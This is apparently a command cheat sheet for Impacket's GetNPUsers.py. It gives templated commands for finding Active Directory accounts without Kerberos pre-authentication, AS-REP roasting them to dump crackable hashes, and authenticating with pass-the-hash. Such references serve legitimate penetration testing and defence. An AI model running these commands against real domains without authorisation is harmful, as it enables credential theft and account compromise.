# GetNPUsers.py

> Enumerate Active Directory accounts with Kerberos pre-authentication disabled, which may be susceptible to AS-REP roasting attacks.
> Part of the Impacket suite.
> More information: <https://github.com/fortra/impacket>.

- Enumerate users with Kerberos pre-authentication disabled (default anonymous enumeration):

`GetNPUsers.py {{domain}}/ -usersfile {{path/to/userslist}} -dc-ip {{domain_controller_ip}}`

- Perform AS-REP roasting and dump crackable hashes for offline cracking:

`GetNPUsers.py {{domain}}/ -usersfile {{path/to/userslist}} -dc-ip {{domain_controller_ip}} -request`

- Authenticate with valid credentials (if anonymous binding is disabled):

`GetNPUsers.py {{domain}}/{{username}}:{{password}} -usersfile {{path/to/userslist}} -dc-ip {{domain_controller_ip}}`

- Use pass-the-hash authentication instead of a password:

`GetNPUsers.py {{domain}}/{{username}} -hashes {{LM_Hash}}:{{NT_Hash}} -usersfile {{path/to/userslist}} -dc-ip {{domain_controller_ip}}`

- Save the output to a file for further analysis:

`GetNPUsers.py {{domain}}/ -usersfile {{path/to/userslist}} -dc-ip {{domain_controller_ip}} -request > {{path/to/output.txt}}`
